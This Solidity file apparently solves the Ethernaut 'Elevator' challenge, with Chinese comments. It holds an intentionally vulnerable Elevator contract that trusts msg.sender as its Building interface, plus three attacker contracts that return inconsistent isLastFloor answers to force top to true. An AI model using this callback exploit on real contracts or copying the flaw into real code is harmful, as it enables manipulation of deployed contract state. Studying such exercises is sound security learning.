// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    Elevator private immutable target;
    uint private count;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function pwn() external {
        target.goTo(1);
        // 检验 target.top() = true;
        require(target.top(), "not top");
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        // 第一次 count = 1, 第二次 count = 2 时返回 true;
        return count > 1;
    }
}

contract Hack2 {
    bool entried; // 没有调用过返回 false；
    Elevator private immutable elevator;

    constructor(address _target) {
        elevator = Elevator(_target);
    }

    function isLastFloor(uint) external returns (bool) {
        if (entried) {
            return true;
        } else {
            entried = true;
            return false;
        }
    }

    function hack() public {
        elevator.goTo(3);
    }
}

contract Hack3 {
    bool public toggle = true;
    Elevator public target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        // 漏洞： 接口不是合约控制的，而是用的 msg.sender;
        Building building = Building(msg.sender);

        // top 是 bool, 要使其成为 true： 首先条件返回时的building.isLastFloor(_floor) 要为 true, 其次赋值给 top 时的building.isLastFloor(_floor) 要为 false
        if (!building.isLastFloor(_floor)) {
            // 检查目标楼层是否是最后一层。如果不是最后一层，它会更新floor变量的值
            floor = _floor;
            // 并根据新的楼层调用building的isLastFloor函数来更新top变量的值。
            top = building.isLastFloor(floor);
        }
    }
}
